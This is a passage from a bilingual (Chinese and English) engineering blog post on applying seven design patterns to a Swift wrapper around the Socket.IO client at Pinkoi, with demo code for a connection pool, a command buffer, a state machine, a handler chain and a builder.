SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"CreatedState can't disconnect!\") }}class SIOConnectionConnectedState: SIOConnectionState { let connectionState: ConnectionState = .connected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { // } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionDisconnectedState: SIOConnectionState { let connectionState: ConnectionState = .disconnected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { // } func release(socketManager: SIOManagerSpec) throws { try stateMachine.enterReleased() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { try stateMachine.enterReconnecting() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReconnectingState: SIOConnectionState { let connectionState: ConnectionState = .reconnecting let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReleasedState: SIOConnectionState { let connectionState: ConnectionState = .released let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onConnected!\") } func onDisconnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onDisconnected!\") } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't release!\") } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't request!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't receiveOn!\") } func send(socketManager: SIOManagerSpec, event: String) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't send!\") } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't disconnect!\") }}do { let stateMachine = SIOConnectionStateMachine() // mock on socket.io connect: // socketIO.on(connect){ try stateMachine.currentSIOConnectionState.onConnected() try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") try stateMachine.currentSIOConnectionState.release(socketManager: manager) try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") // }} catch { print(\"error: \\(error)\")}// output:// error: SIOConnectionStateMachineError(message: \"ConnectedState can\\'t release!\")需求場景 3.What?結合場景 1. 2.，有了 ConnectionPool 享元池子加上 State Pattern 狀態管理後；我們繼續往下延伸，如背景目標所述，Feature 端不需去管背後 Connection 的連線機制；因此我們建立了一個輪詢器 (命名為 ConnectionKeeper ) 會定時掃描 ConnectionPool 中強持有的 Connection ，並在發生以下狀況時做操作： Connection 有人在使用且狀態非 Connected ：將狀態改為 Reconnecting 並嘗試重新連線 Connection 已無人使用且狀態為 Connected ：將狀態改為 Disconnected Connection 已無人使用且狀態為 Disconnected ：將狀態改為 Released 並從 ConnectionPool 中移除Why? 三個操作有上下關係且互斥 (disconnected -&gt; released or reconnecting) 可彈性抽換、增加狀況操作 未封裝的話只能將三個判斷及操作直接寫在方法中 (難以測試其中邏輯) e.g:if !connection.isOccupie() &amp;&amp; connection.state == .connected then... connection.disconnected()else if !connection.isOccupie() &amp;&amp; state == .released then... connection.release()else if connection.isOccupie() &amp;&amp; state == .disconnected then... connection.reconnecting()endHow? Chain Of Resposibility ：行為型 Pattern，顧名思義是一條鏈，每個節點都有相應的操作，輸入資料後節點可決定是否要操作還是丟給下一個節點處理，另一個現實應用是 iOS Responder Chain 。 照定義 Chain of responsibility Pattern 是不允許某個節點已經接下處理資料，但處理完又丟給下一個節點繼續處理， 要做就做完，不然不要做 。 如果是上述場景比較適合的應該是 Interceptor Pattern 。 Chain of responsibility： ConnectionKeeperHandler 為鍊的節點抽象，特別抽出 canExcute 方法避免發生上述 這個節點接下來處理了，但做完又想呼叫後面的節點繼續執行的狀況、 handle 為鍊的節點串連、 excute 為要處理的話會怎麼處理的邏輯。ConnectionKeeperHandlerContext 用來存放會用到的資料， isOccupie 代表 Connection 有無人在使用。enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//struct ConnectionKeeperHandlerContext { let connection: Connection let isOccupie: Bool}protocol ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? { get set } func handle(context: ConnectionKeeperHandlerContext) func execute(context: ConnectionKeeperHandlerContext) func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool}extension ConnectionKeeperHandler { func handle(context: ConnectionKeeperHandlerContext) { if canExcute(context: context) { execute(context: context) } else { nextHandler?.handle(context: context) } }}class DisconnectedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .connected &amp;&amp; !context.isOccupie { return true } return false }}class ReconnectConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.reconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; context.isOccupie { return true } return false }}class ReleasedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; !context.isOccupie { return true } return false }}let connection = SIOConnection(url: URL(string: \"wss://pinkoi.com\")!)let disconnectedHandler = DisconnectedConnectionKeeperHandler()let reconnectHandler = ReconnectConnectionKeeperHandler()let releasedHandler = ReleasedConnectionKeeperHandler()disconnectedHandler.nextHandler = reconnectHandlerreconnectHandler.nextHandler = releasedHandlerdisconnectedHandler.handle(context: ConnectionKeeperHandlerContext(connection: connection, isOccupie: false))需求場景 4.What?我們封裝出的 Connection 需要經過 setup 後才能使用，例如給予 URL Path、設定 Config…等等Why? 可以彈性的增減構建開口 可複用構建邏輯 未封裝的話，外部可以不照預期操作類別 e.g.:❌let connection = Connection()connection.send(event) // unexpected method call, should call .connect() first✅let connection = Connection()connection.connect()connection.send(event)// but...who knows???How? Builder Pattern ：創建型 Pattern，能夠分步驟構建對象及複用構建方法。 Builder Pattern： SIOConnectionBuilder 為 Connection 的構建器，負責設定、存放構建 Connection 時會用到的資料； ConnectionConfiguration 抽象介面用來保證要使用 Connection 前必須呼叫 .connect() 才能拿到 Connection 實體。enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//class SIOConnectionClient: ConnectionConfiguration { private let url: URL private let config: [String: Any] init(url: URL, config: [String: Any]) { self.url = url self.config = config } func connect() -&gt; Connection { // set config return SIOConnection(url: url) }}protocol ConnectionConfiguration { func connect() -&gt; Connection}class SIOConnectionBuilder { private(set) var config: [String: Any] = [:] func setConfig(_ config: [String: Any]) -&gt; SIOConnectionBuilder { self.config = config return self } // url is required parameter func build(url: URL) -&gt; ConnectionConfiguration { return SIOConnectionClient(url: url, config: self.config) }}let builder = SIOConnectionBuilder().setConfig([\"test\":123])let connection1 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()let connection2 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()延伸：這裏也可以再套用 Factory Pattern ，將用工廠產出 SIOConnection 。完結!以上就是本次封裝 Socket.IO 中遇到的四個場景及七個使用到解決問題的 Design Patterns。最後附上此次封裝 Socket.IO 的完整設計藍圖與文中命名、示範略為不同，這張圖才是真實的設計架構；有機會再請原設計者分享設計理念及開源。Who?誰做了這些設計跟負責 Socket.IO 封裝專案呢？Sean Zheng , Android Engineer @ Pinkoi主要架構設計者、Design Pattern 評估套用、在 Android 端使用 Kotlin 實現設計。ZhgChgLi , Enginner Lead/iOS Enginner @ PinkoiPlatform Team 專案負責人、Pair programming、在 iOS 端使用 Swift 實現設計、討論並提出質疑(a.k.a. 出一張嘴)及最後撰寫本文與大家分享。延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 3,931 Total Views Last Statistics Date: 2025-08-15 | 3,650 Views on Medium." }, { "title": "Practical Applications of Design Patterns", "url": "/posts/pinkoi-engineering/en/practical-applications-of-design-patterns-78507a8de6a5/", "categories": "Pinkoi Engineering", "tags": "ios-app-development, design-patterns, socketio, websocket, finite-state-machine", "date": "2022-04-07 22:49:17 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Practical Applications of Design PatternsThis article documents real-world developme...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Practical Applications of Design PatternsThis article documents real-world development scenarios encountered while encapsulating the Socket.IO Client Library, along with the design patterns applied to solve these issues.Photo by Daniel McCulloughIntroductionThis article records the practical application of design patterns in addressing real development needs. It covers the background of the requirements, the specific problems encountered (What?), the rationale for applying design patterns (Why?), and how to implement them (How?). It is recommended to read from the beginning for better coherence. This article will introduce four scenarios encountered during the development of this requirement and seven design patterns applied to address these scenarios.BackgroundOrganizational StructureOur company has recently split into multiple Feature Teams and a Platform Team. The Feature Teams primarily handle user-facing requirements, while the Platform Team focuses on internal technical integration, infrastructure, and paving the way for the Feature Teams during development.Current RequirementThe Feature Teams need to transform the existing messaging functionality (where users had to refresh the page to get the latest messages) into real-time communication (where users can receive messages instantly and send messages).Platform Team’s RoleThe Platform Team’s focus is not just on the immediate real-time communication requirement but also on long-term infrastructure and reusability. After evaluation, we determined that the WebSocket bidirectional communication mechanism is essential in modern apps. This requirement will likely be needed in many future projects, so we decided to assist in designing and developing the interface.Goals: Encapsulate communication and authentication logic between the Pinkoi Server Side and Socket.IO. Simplify the complex operations of Socket.IO, providing an extensible and user-friendly interface based on Pinkoi’s business needs. Standardize the interface across both platforms (the functionalities and interfaces supported by Socket.IO’s Android and iOS Client Side Libraries differ). Ensure that the Feature Teams do not need to understand the Socket.IO mechanism. Allow the Feature Teams to avoid managing complex connection states. Enable future use of WebSocket bidirectional communication directly.Time and Resources: One developer for iOS and one for Android. Development timeline: 3 weeks.Technical DetailsThe feature will be supported across Web, iOS, and Android platforms. We plan to implement the WebSocket bidirectional communication protocol using the Socket.IO service on the backend. First, it’s important to clarify that Socket is not the same as WebSocket.For more information on the differences between Socket and WebSocket, refer to the following articles: Differences between Socket, WebSocket, and Socket.IO Why not use Socket directly and define a new WebSocket?In short:Socket is an abstract interface for TCP/UDP transport layers, while WebSocket is an application layer transport protocol.The relationship between Socket and WebSocket is like that of a dog and a hot dog; they are unrelated.Socket.IO is an abstraction layer over Engine.IO, which itself encapsulates the use of WebSocket. Each layer is responsible for communication between the layers above and below it, and direct operations (e.g., Socket.IO directly manipulating WebSocket connections) are not allowed.In addition to basic WebSocket connections, Socket.IO/Engine.IO implements many convenient features (e.g., offline event sending mechanism, HTTP request-like mechanism, Room/Group mechanism, etc.).The primary responsibility of the Platform Team is to bridge the logic between Socket.IO and the Pinkoi Server Side for the Feature Teams to use when developing functionalities.Challenges with Socket.IO Swift Client The library has not been updated for a long time (the latest version is from 2019), and it’s unclear if it is still maintained. The Client and Server Side Socket.IO versions must align; the Server Side can include {allowEIO3: true} or the Client Side can specify the same version with .version, otherwise, connections will fail. Naming conventions and interfaces often do not match the official examples. The Socket.IO official examples are primarily based on web implementations, and the Swift Client does not necessarily support all the features described on the official site. During this implementation, we found that the iOS library does not implement the offline event sending mechanism (which we implemented ourselves; please read on). It is recommended to test the desired mechanisms before adopting Socket.IO. The Socket.IO Swift Client is a wrapper around the Starscream WebSocket Library, which can be used directly if necessary.This concludes the background information; let's move on to the main topic.Design PatternsDesign patterns are essentially common solutions to recurring problems in software design. It is not necessary to use design patterns to develop software, and not all design patterns are suitable for every scenario. There is no rule against creating new design patterns.The Catalog of Design PatternsHowever, the existing design patterns (the 23 Gang of Four Design Patterns) are common knowledge in software design. When a specific pattern is mentioned, a corresponding architectural blueprint comes to mind, requiring little explanation. This also aids in future maintenance, as the methods have been validated by the industry, reducing the time spent on reviewing object dependencies. Choosing the appropriate pattern for the right scenario can lower communication and maintenance costs and enhance development efficiency. Design patterns can be used in combination, but it is not advisable to modify existing patterns excessively or to apply them forcefully inappropriately (e.g., using the Chain of Responsibility pattern to create objects), as this can defeat their purpose and lead to misunderstandings for future maintainers.The Design Patterns Discussed in This Article: Singleton Pattern Flyweight Pattern Factory Pattern Command Pattern Finite-State Machine + State Pattern Chain of Responsibility Builder PatternEach pattern will be explained in the context of its application, along with the reasons for its use. This article focuses on the application of design patterns rather than the operations of Socket.IO. Some examples may be simplified for clarity and are not applicable to the actual Socket.IO encapsulation. Due to space limitations, this article will not provide detailed explanations of each design pattern’s structure. Please click on the links for each pattern to understand their structures before continuing to read. Demo code will be written in Swift.Requirement Scenario 1What? Reuse the same connection object across different pages and objects using the same path. The connection must be an abstract interface, not directly dependent on the Socket.IO object.Why? Reduce memory overhead and the time and bandwidth costs of repeated connections. Allow for future replacement with other frameworks.How? Singleton Pattern: A creational pattern that ensures a class has only one instance and provides a global point of access to it. Flyweight Pattern: A structural pattern that allows sharing of objects to support a large number of fine-grained objects efficiently. Factory Pattern: A creational pattern that provides an interface for creating objects in a superclass but allows subclasses to alter the type of objects that will be created.Practical Example: Singleton Pattern: The ConnectionManager exists as a single object throughout the app lifecycle, managing the operations for obtaining connections. Flyweight Pattern: The ConnectionPool serves as a shared pool for connections, providing a method to retrieve connections from this pool. The logic includes returning an existing connection from the pool if the URL path matches.The ConnectionHandler acts as an external operator and state manager for the Connection. Factory Pattern: The ConnectionFactory works with the Flyweight Pattern to create a new connection when none is available in the pool.import Combineimport Foundationprotocol Connection { var url: URL { get } var id: UUID { get } init(url: URL) func connect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}protocol ConnectionFactory { func create(url: URL) -&gt; Connection}class ConnectionPool { private let connectionFactory: ConnectionFactory private var connections: [Connection] = [] init(connectionFactory: ConnectionFactory) { self.connectionFactory = connectionFactory } func getOrCreateConnection(url: URL) -&gt; Connection { if let connection = connections.first(where: { $0.url == url }) { return connection } else { let connection = connectionFactory.create(url: url) connections.append(connection) return connection } } }class ConnectionHandler { private let connection: Connection init(connection: Connection) { self.connection = connection } func getConnectionUUID() -&gt; UUID { return connection.id }}class ConnectionManager { static let shared = ConnectionManager(connectionPool: ConnectionPool(connectionFactory: SIOConnectionFactory())) private let connectionPool: ConnectionPool private init(connectionPool: ConnectionPool) { self.connectionPool = connectionPool } func requestConnectionHandler(url: URL) -&gt; ConnectionHandler { let connection = connectionPool.getOrCreateConnection(url: url) return ConnectionHandler(connection: connection) }}// Socket.IO Implementationclass SIOConnection: Connection { let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}class SIOConnectionFactory: ConnectionFactory { func create(url: URL) -&gt; Connection { // return SIOConnection(url: url) }}//print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/2\")!).getConnectionUUID().uuidString)// output:// D99F5429-1C6D-4EB5-A56E-9373D6F37307// D99F5429-1C6D-4EB5-A56E-9373D6F37307// 599CF16F-3D7C-49CF-817B-5A57C119FE31Requirement Scenario 2What?As mentioned in the technical details, the Socket.IO Swift Client’s Send Event does not support offline sending (unlike the Web/Android versions). Therefore, the iOS side needs to implement this functionality.Interestingly, the Socket.IO Swift Client's onEvent does support offline subscriptions.Why? To unify functionality across platforms. To make the code easier to understand.How? Command Pattern: A behavioral pattern that encapsulates a request as an object, thereby allowing for parameterization of clients with queues, requests, and operations. Command Pattern: The SIOManager serves as the lowest-level encapsulation for communicating with Socket.IO. Its send and request methods operate on the Socket.IO Send Event. When the current Socket.IO is disconnected, the request parameters are placed into bufferedCommands, which are processed sequentially (First In First Out) once the connection is reestablished.protocol BufferedCommand { var sioManager: SIOManagerSpec? { get set } var event: String { get } func execute()}struct SendBufferedCommand: BufferedCommand { let event: String weak var sioManager: SIOManagerSpec? func execute() { sioManager?.send(event) }}struct RequestBufferedCommand: BufferedCommand { let event: String let callback: (Data?) -&gt; Void weak var sioManager: SIOManagerSpec? func execute() { sioManager?.request(event, callback: callback) }}protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connectedSimilarly, this can also be implemented for onEvent.As an extension, the Proxy Pattern can be applied, viewing the buffer functionality as a type of proxy.Requirement Scenario 3What?The connection has multiple states, with ordered transitions between states, and different operations allowed in each state.Here’s the translated text in naturalistic English while preserving the original markdown image source: Created: The object has been created, allowing transitions to Connected or directly to Disconnected. Connected: The connection to Socket.IO is established, allowing a transition to Disconnected. Disconnected: The connection to Socket.IO has been lost, allowing transitions to Reconnecting or Released. Reconnecting: Attempting to reconnect to Socket.IO, allowing transitions to Connected or Disconnected. Released: The object has been marked for garbage collection, and no operations or state transitions are allowed.Why? The logic and expressions for state transitions are not easy to understand. Each state needs to restrict operational methods (e.g., when State = Released, calling Send Event is not allowed). Using simple if-else statements makes the code hard to maintain and read.How? Finite State Machine: Manages transitions between states. State Pattern: A behavioral pattern that provides different handling when an object’s state changes. Finite State Machine: SIOConnectionStateMachine is the implementation of the state machine, with currentSIOConnectionState representing the current state. The states created, connected, disconnected, reconnecting, and released are listed as possible transitions for this state machine. The method enterXXXState() throws implements the allowed and disallowed transitions (throwing an error) when entering a certain state from the current state. State Pattern: SIOConnectionState is the abstract interface for all operations that will be used by the states.protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send: \\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"Request: \\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected//class SIOConnectionStateMachine { private(set) var currentSIOConnectionState: SIOConnectionState! private var created: SIOConnectionState! private var connected: SIOConnectionState! private var disconnected: SIOConnectionState! private var reconnecting: SIOConnectionState! private var released: SIOConnectionState! init() { self.created = SIOConnectionCreatedState(stateMachine: self) self.connected = SIOConnectionConnectedState(stateMachine: self) self.disconnected = SIOConnectionDisconnectedState(stateMachine: self) self.reconnecting = SIOConnectionReconnectingState(stateMachine: self) self.released = SIOConnectionReleasedState(stateMachine: self) self.currentSIOConnectionState = created } func enterConnected() throws { if [created.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(connected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Connected\") } } func enterDisconnected() throws { if [created.connectionState, connected.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(disconnected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Disconnected\") } } func enterReconnecting() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(reconnecting) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Reconnecting\") } } func enterReleased() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(released) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Released\") } } private func enter(_ state: SIOConnectionState) { currentSIOConnectionState = state }}protocol SIOConnectionState { var connectionState: ConnectionState { get } var stateMachine: SIOConnectionStateMachine { get } init(stateMachine: SIOConnectionStateMachine) func onConnected() throws func onDisconnected() throws func connect(socketManager: SIOManagerSpec) throws func disconnect(socketManager: SIOManagerSpec) throws func release(socketManager: SIOManagerSpec) throws func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func send(socketManager: SIOManagerSpec, event: String) throws}struct SIOConnectionStateMachineError: Error { let message: String init(_ message: String) { self.message = message } var localizedDescription: String { return message }}class SIOConnectionCreatedState: SIOConnectionState { let connectionState: ConnectionState = .created let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"CreatedState can't disconnect!\") }}class SIOConnectionConnectedState: SIOConnectionState { let connectionState: ConnectionState = .connected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { // } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionDisconnectedState: SIOConnectionState { let connectionState: ConnectionState = .disconnected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() 